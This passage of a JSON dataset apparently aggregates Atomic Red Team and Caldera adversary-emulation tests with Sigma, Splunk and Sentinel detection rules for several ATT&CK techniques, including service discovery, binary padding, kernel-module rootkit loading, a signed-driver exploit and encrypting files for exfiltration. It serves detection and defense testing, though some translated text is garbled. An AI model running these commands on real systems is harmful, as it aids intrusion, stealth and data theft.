"supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "tasklist.exe\nsc query\nsc query state= all\n"}}, {"name": "System Service Discovery - net.exe", "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in c:\\Windows\\Temp\\service-list.txt.s\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "Path of file to hold net.exe output", "type": "Path", "default": "C:\\Windows\\Temp\\service-list.txt"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net.exe start >> #{output_file}\n", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"}}]}}, {"Mitre Stockpile - Identify system services": {"id": "c6607391-d02c-44b5-9b13-d3492ca58599", "name": "Discover system services", "description": "Identify system services", "tactic": "discovery", "technique": {"attack_id": "T1007", "name": "System Service Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-Service"}}}}}], "command_list": ["tasklist.exe\nsc query\nsc query state= all\n", "net.exe start >> C:\\Windows\\Temp\\service-list.txt\n", {"windows": {"psh": {"command": "Get-Service"}}}, "Dos\nC: \\ Windows \\ system32> sc query\n\nSERVICE_NAME: BFE\nDISPLAY_NAME: Base Filtering Engine\nTYPE: 20 WIN32_SHARE_PROCESS\nSTATE: 4 RUNNING\n(STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\nWIN32_EXIT_CODE: 0 (0x0)\nSERVICE_EXIT_CODE: 0 (0x0)\nCHECKPOINT: 0x0\nWAIT_HINT: 0x0", "Dos\nC: \\ Windows \\ system32> tasklist / svc\n\nImage Name PID Service\n========================= ======== ================= ===========================\nSystem Idle Process 0 Temp Out\nSystem 4 Temp Out\nsmss.exe 288 temporary shortage\ncsrss.exe 420 temporary shortage\ncsrss.exe 532 temporary shortage\nwininit.exe 576 temporary shortage\nwinlogon.exe 584 temporary shortage\nservices.exe 664 temporary shortage", "Dos\nC: \\ Windows \\ system32> net start\nIt has been launched the following Windows services:\n\nBackground Tasks Infrastructure Service\nBase Filtering Engine\nCDPUserSvc_11e76e\nCertificate Propagation\nCNG Key Isolation\nCOM + Event System\nCOM + System Application"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"tasklist.exe\"or process_path contains \"sc.exe\"or process_path contains \"wmic.exe\")and (file_directory contains \"net.exe\\\" start\"or file_directory contains \"tasklist.exe\\\" /SVC\"and file_directory contains \"sc.exe\\\" query\"or file_directory contains \"wmic.exe\\\" service where\")", "name": "System Service Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ sc.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: SC * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ tasklist.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: tasklist * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2: # * 5\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4690 # trying to duplicate a handle to an object.\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4658 # closed to object handles.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4656 # objects have to handle the request.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: '\\ Device \\ HarddiskVolume4 \\ Windows \\ System32 \\ lsass.exe' # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection6:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4633 # trying to access the object.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objectname: '\\ Device \\ HarddiskVolume4 \\ Windows \\ System32 \\ lsass.exe' # Object> object name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Access: read process memory access request information #> Access\n\u00a0\u00a0\u00a0\u00a0selection7:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4658 # closed to object handles.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ wbem \\ WmiPrvSE.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection8:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ tasklist.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Exitstatus: 0x0 # Process information> exit status\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1007\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net start # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 start # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Query Registry", "id": "970007b7-ce32-49d0-a4a4-fbef016950bd", "status": "experimental", "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": "\\reg.exe", "CommandLine|contains": ["currentVersion\\windows", "currentVersion\\runServicesOnce", "currentVersion\\runServices", "winlogon\\", "currentVersion\\shellServiceObjectDelayLoad", "currentVersion\\runOnce", "currentVersion\\runOnceEx", "currentVersion\\run", "currentVersion\\policies\\explorer\\run", "currentcontrolset\\services"]}, "condition": "selection"}, "fields": ["Image", "CommandLine", "User", "LogonGuid", "Hashes", "ParentProcessGuid", "ParentCommandLine"], "level": "low", "tags": ["attack.discovery", "attack.t1012", "attack.t1007"]}}]}, {"technique_id": "T1009", "commands": [{"source": "atomics/T1009/T1009.yaml", "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sha1sum welcome.sh >before", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "dd if=/dev/zero bs=1 count=1 >> welcome.sh", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "<<", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1+0 records in", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1+0 records out", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "1 byte (1 B) copied, 0.000221464 s, 4.5 kB/s", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": ">>", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "sha1sum welcome.sh >after", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cmp before after", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "<<before after differ: byte 1, line 1>>", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Binary Padding": {"attack_technique": "T1009", "display_name": "Binary Padding", "atomic_tests": [{"name": "Pad Binary to Change Hash - Linux/macOS dd", "description": "Uses dd to add a zero to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_pad": {"description": "Path of binary to be padded", "type": "Path", "default": "/tmp/evil-binary"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The binary must exist on disk at specified location (#{file_to_pad})\n", "prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "cp /bin/ls /tmp/evil-binary\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}\n"}}]}}], "command_list": ["dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary\n", "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}", "```", "sha1sum welcome.sh >before", "dd if=/dev/zero bs=1 count=1 >> welcome.sh", "<<", "1+0 records in", "1+0 records out", "1 byte (1 B) copied, 0.000221464 s, 4.5 kB/s", ">>", "sha1sum welcome.sh >after", "cmp before after", "<<before after differ: byte 1, line 1>>", "```"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "```index=linux sourcetype=\"bash_history\" bash_command=\"dd *\"```", "name": null}, {"product": "Splunk", "query": "", "name": null}], "possible_detections": [{"data_source": "```bash_history logs```"}, {"data_source": {"title": "Failed Code Integrity Checks", "id": "470ec5fa-7b4e-4071-b200-4c753100f49b", "status": "stable", "description": "Code integrity failures may indicate tampered executables.", "author": "Thomas Patzke", "tags": ["attack.defense_evasion", "attack.t1009"], "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [5038, 6281]}, "condition": "selection"}, "falsepositives": ["Disk device errors"], "level": "low"}}]}, {"technique_id": "T1010", "commands": [{"source": "atomics/T1010/T1010.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} PathToAtomicsFolder\\T1010\\src\\T1010.cs\n#{output_file_name}\n", "name": null}, {"source": "atomics/T1010/T1010.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:$env:TEMP\\T1010.exe #{input_source_code}\n$env:TEMP\\T1010.exe\n", "name": null}, {"source": "data/abilities/discovery/5c65eec8-4839-4713-a4e1-86b2e75d1927.yml", "command": {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}, "name": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows."}], "parsed_datasets": [{"Atomic Red Team Test - Application Window Discovery": {"attack_technique": "T1010", "display_name": "Application Window Discovery", "atomic_tests": [{"name": "List Process Main Windows - C# .NET", "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"input_source_code": {"description": "Path to source of C# code", "type": "path", "default": "PathToAtomicsFolder\\T1010\\src\\T1010.cs"}, "output_file_name": {"description": "Name of output binary", "type": "string", "default": "$env:TEMP\\T1010.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1010.cs must exist on disk at specified location (#{input_source_code})\n", "prereq_command": "if (Test-Path #{input_source_code}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile \"#{input_source_code}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} #{input_source_code}\n#{output_file_name}\n", "cleanup_command": "del /f /q /s #{output_file_name} >nul 2>&1\n"}}]}}, {"Mitre Stockpile - Extracts the names of all open non-explorer windows, and the locations of all explorer windows.": {"id": "5c65eec8-4839-4713-a4e1-86b2e75d1927", "name": "Application Window Discovery", "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.", "tactic": "discovery", "technique": {"attack_id": "T1010", "name": "Application Window Discovery"}, "platforms": {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}}}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} PathToAtomicsFolder\\T1010\\src\\T1010.cs\n#{output_file_name}\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:$env:TEMP\\T1010.exe #{input_source_code}\n$env:TEMP\\T1010.exe\n", {"windows": {"psh": {"command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)"}}}], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows local Powershell command execution, enumerate the application window\ndescription: windows server 2016\nreferences: No\ntags: T1010\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: powershell\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4104 # remote command execution\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0message:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'get-process | where-object {. $ _ Mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle' # command line parameters based on the detection, the detection rate is low\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0-. [Activator] :: CreateInstance ([type] :: GetTypeFromCLSID ( \"13709620-C279-11CE-A49E-444553540000\")) windows () # command line parameters based on the detection, the detection rate is low\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: low", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1014", "commands": [{"source": "atomics/T1014/T1014.yaml", "command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo insmod #{rootkit_path}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo insmod #{rootkit_path}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo insmod #{rootkit_path}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo modprobe #{rootkit_name}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo modprobe T1014\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo modprobe #{rootkit_name}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "sudo modprobe #{rootkit_name}\n", "name": null}, {"source": "atomics/T1014/T1014.yaml", "command": "puppetstrings C:\\Drivers\\driver.sys\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Loadable Kernel Module based Rootkit": {"attack_technique": "T1014", "display_name": "Loadable Kernel Module based Rootkit", "atomic_tests": [{"name": "Loadable Kernel Module based Rootkit", "description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "input_arguments": {"rootkit_path": {"description": "Path To rootkit", "type": "String", "default": "PathToAtomicsFolder/T1014/bin/T1014.ko"}, "rootkit_name": {"description": "Module name", "type": "String", "default": "T1014"}, "rootkit_source_path": {"description": "Path to the rootkit source. Used when prerequistes are fetched.", "type": "path", "default": "PathToAtomicsFolder/T1014/src/Linux"}, "temp_folder": {"description": "Temp folder used to compile the code. Used when prerequistes are fetched.", "type": "path", "default": "/tmp/T1014"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location (#{rootkit_path})\n", "prereq_command": "if [ -f #{rootkit_path} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{rootkit_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make\nmv #{temp_folder}/#{rootkit_name}.ko #{rootkit_path}\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo insmod #{rootkit_path}\n", "cleanup_command": "sudo rmmod #{rootkit_name}\n"}}, {"name": "Loadable Kernel Module based Rootkit", "description": "Loadable Kernel Module based Rootkit\n", "supported_platforms": ["linux"], "input_arguments": {"rootkit_path": {"description": "Path To rootkit", "type": "String", "default": "PathToAtomicsFolder/T1014/bin/T1014.ko"}, "rootkit_name": {"description": "Module name", "type": "String", "default": "T1014"}, "rootkit_source_path": {"description": "Path to the rootkit source. Used when prerequistes are fetched.", "type": "path", "default": "PathToAtomicsFolder/T1014/src/Linux"}, "temp_folder": {"description": "Temp folder used to compile the code. Used when prerequistes are fetched.", "type": "path", "default": "/tmp/T1014"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The kernel module must exist on disk at specified location (#{rootkit_path})\n", "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ ! -d #{temp_folder} ]; then mkdir #{temp_folder}; touch #{temp_folder}/safe_to_delete; fi;\ncp #{rootkit_source_path}/* #{temp_folder}/\ncd #{temp_folder}; make        \nsudo cp #{temp_folder}/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f #{temp_folder}/safe_to_delete ] && rm -rf #{temp_folder}\nsudo depmod -a\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo modprobe #{rootkit_name}\n", "cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n"}}, {"name": "Windows Signed Driver Rootkit Test", "description": "This test exploits a signed driver to execute code in Kernel.\nSHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7\nWe leverage the work done here:\nhttps://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html\nThe hash of our PoC Exploit is\nSHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441\nThis will simulate hiding a process.\nIt would be wise if you only run this in a test environment\n", "supported_platforms": ["windows"], "input_arguments": {"driver_path": {"description": "Path to the vulnerable driver", "type": "Path", "default": "C:\\Drivers\\driver.sys"}}, "executor": {"name": "command_prompt", "command": "puppetstrings #{driver_path}\n"}}]}}], "command_list": ["sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko\n", "sudo insmod #{rootkit_path}\n", "sudo insmod #{rootkit_path}\n", "sudo insmod #{rootkit_path}\n", "sudo modprobe #{rootkit_name}\n", "sudo modprobe T1014\n", "sudo modprobe #{rootkit_name}\n", "sudo modprobe #{rootkit_name}\n", "puppetstrings C:\\Drivers\\driver.sys\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1022", "commands": [{"source": "atomics/T1022/T1022.yaml", "command": "mkdir -p /tmp/T1022\ncd /tmp/T1022; touch a b c d e f g\nzip --password \"#{encryption_password}\" /tmp/T1022/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1022/#{test_file}.zip.gpg -c /tmp/T1022/#{test_file}.zip\nls -l /tmp/T1022\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/T1022 ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/T1022.zip.gpg -c #{test_folder}/T1022.zip\nls -l #{test_folder}\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"InsertPasswordHere\" #{test_folder}/#{test_file} ./*\necho \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "name": null}, {"source": "atomics/T1022/T1022.yaml", "command": "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Data Encrypted": {"attack_technique": "T1022", "display_name": "Data Encrypted", "atomic_tests": [{"name": "Data Encrypted with zip and gpg symmetric", "description": "Encrypt data for exiltration\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"test_folder": {"description": "Path used to store files.", "type": "Path", "default": "/tmp/T1022"}, "test_file": {"description": "Temp file used to store encrypted data.", "type": "Path", "default": "T1022"}, "encryption_password": {"description": "Password used to encrypt data.", "type": "string", "default": "InsertPasswordHere"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "gpg and zip are required to run the test.", "prereq_command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then exit 1; fi;\n", "get_prereq_command": "echo \"Install gpg and zip to run the test\"; exit 1;\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "cleanup_command": "rm -Rf #{test_folder}\n"}}, {"name": "Compress Data and lock with password for Exfiltration with winrar", "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n"}}, {"name": "Compress Data and lock with password for Exfiltration with winzip", "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n", "supported_platforms": ["windows"], "input_arguments": {"winzip_exe": {"description": "Path to installed Winzip executable", "type": "Path", "default": "%ProgramFiles%\\WinZip\\winzip64.exe"}, "winzip_url": {"description": "Path to download Windows Credential Editor zip file", "type": "url", "default": "https://download.winzip.com/gl/nkln/winzip24-home.exe"}, "winzip_hash": {"description": "File hash of the Windows Credential Editor zip file", "type": "String", "default": "B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Winzip must be installed\n", "prereq_command": "cmd /c 'if not exist \"#{winzip_exe}\" (echo 1) else (echo 0)'\n", "get_prereq_command": "if(Invoke-WebRequestVerifyHash \"#{winzip_url}\" \"$env:Temp\\winzip.exe\" #{winzip_hash}){\n  Write-Host Follow the installation prompts to continue\n  cmd /c \"$env:Temp\\winzip.exe\"\n}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > 